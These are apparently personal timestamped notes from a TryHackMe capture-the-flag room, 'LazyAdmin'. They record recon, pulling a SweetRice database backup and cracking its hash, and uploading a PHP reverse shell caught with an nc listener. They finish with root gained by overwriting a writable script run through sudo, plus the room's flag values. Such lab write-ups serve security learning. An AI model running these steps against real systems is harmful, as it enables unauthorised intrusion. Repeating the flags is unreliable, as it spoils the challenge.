```

LazyAdmin_Attempt2
IP:10.10.119.23

to bring down vpn tunnels: sudo ifconfig tun1 down
```

```
6:41 PM 1/10/2023
nmap -sC -sV -oA nmap 10.10.119.23 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.32 seconds
```

```
6:43 PM 1/10/2023
dirsearch -u http://10.10.119.23 -x 400,401,403 
```

```
6:46 PM 1/10/2023
Default apache2 page.

Target: http://10.10.119.23/

[23:46:33] Starting: 
[23:47:21] 301 -  314B  - /content  ->  http://10.10.119.23/content/
[23:47:22] 200 -    2KB - /content/
[23:47:31] 200 -   11KB - /index.html

Task Completed
```

```
6:52 PM 1/10/2023
http://10.10.119.23/content/ displays a sweetrice page, looking up exploits

Google "Sweetrice Exploits"

https://www.exploit-db.com/exploits/40716
Sweet rice arbitry file upload, need creds:

https://www.exploit-db.com/exploits/40718
States that should be able to navigate to /inc/mysql_backup directory
```

```
6:55 PM 1/10/2023
able to navigate to http://10.10.119.23/content/inc/mysql_backup/
#pulling back this file

manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\" Identified in file # going to break hash
```

```
6:57 PM 1/10/2023
Crackstationed hash

manager:Password123
```

```
6:58 PM 1/10/2023
due to already knowing that arbitrary file upload isnt going to work - the exploit
# https://www.exploit-db.com/exploits/40716
#Sweet rice arbitry file upload, need creds:
Going to still use the code to determine where to go next in the directory tree.

with session() as r:
    login = r.post('http://' + host + '/as/?type=signin', data=payload)
	
Trying http://10.10.119.23/content/as/
```

```
7:00 PM 1/10/2023 Able to submit credentials.
```

```
7:05 PM 1/10/2023 
Able to submit php script to get into a cmd line - more notes on cherry tree.
```

```
7:06 PM 1/10/2023
using code in /home/kali/Documents/transfer/php-reverse-shell.php on kali box
```

```
7:08 PM 1/10/2023
just pasted in, location to execute file is under _themes/default/cat.php 

http://10.10.119.23/content/as


http://10.10.119.23/content/_themes/default/cat.php # THIS IS THE ONE THAT WORKED.

SETTING UP NC NOW
```

```
7:15 PM 1/10/2023
# nc -lvnp 1234
```

```
7:19 PM 1/10/2023
python -c "import pty;pty.spawn('/bin/bash')"
# used to spawn a bin/bash shell

	www-data@THM-Chal:/$ sudo -l
	sudo -l
	Matching Defaults entries for www-data on THM-Chal:
		env_reset, mail_badpass,
		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User www-data may run the following commands on THM-Chal:
		(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

	www-data@THM-Chal:/$ ls -la /home/itguy/backup.pl
	ls -la /home/itguy/backup.pl
	-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl #no writing permisiions, going to see whats in here
	www-data@THM-Chal:/$ 
```

```	
7:39 PM 1/10/2023 after vpn kept dropping.... back on

	www-data@THM-Chal:/$ sudo -l
	sudo -l
	Matching Defaults entries for www-data on THM-Chal:
		env_reset, mail_badpass,
		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User www-data may run the following commands on THM-Chal:
		(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
	www-data@THM-Chal:/$ cat /home/itguy/backup.pl #####
	cat /home/itguy/backup.pl
	l#!/usr/bin/perl

	system("sh", "/etc/copy.sh"); ####
```

```
7:42 PM 1/10/2023
Checking permissions of this file.
www-data@THM-Chal:/$ ls -la /etc/copy.sh
ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh # executable by root.

# echoing bin bash into a file that

echo "/bin/bash" > /etc/copy.sh 

#checking to ensure bin bash is in there.

www-data@THM-Chal:/$ cat /etc/copy.sh 
cat /etc/copy.sh 
/bin/bash
www-data@THM-Chal:/$ 
# good to go, going to try to execute the path with sudo 

www-data@THM-Chal:/$ sudo /usr/bin/perl /home/itguy/backup.pl
sudo /usr/bin/perl /home/itguy/backup.pl
root@THM-Chal:/# 

root@THM-Chal:/# whoami
whoami
root
root@THM-Chal:/# 
root@THM-Chal:/# cd /root
cd /root
root@THM-Chal:~# ls
ls
root.txt
root@THM-Chal:~# cat root.txt	
cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
root@THM-Chal:~# 
root@THM-Chal:/home# ls
ls
itguy
root@THM-Chal:/home# cd itguy 
cld itguy
root@THM-Chal:/home/itguy#ls
ls
Desktop    Downloads  Pictures  Templates  backup.pl         mysql_login.txt
Documents  Music      Public    Videos     examples.desktop  user.txt
root@THM-Chal:/home/itguy# cat user.t	
cat user.txt 
THM{63e5bce9271952aad1113b6f1ac28a07}


Flags: THM{63e5bce9271952aad1113b6f1ac28a07}
THM{6637f41d0177b6f37cb20d775124699f}n   
```


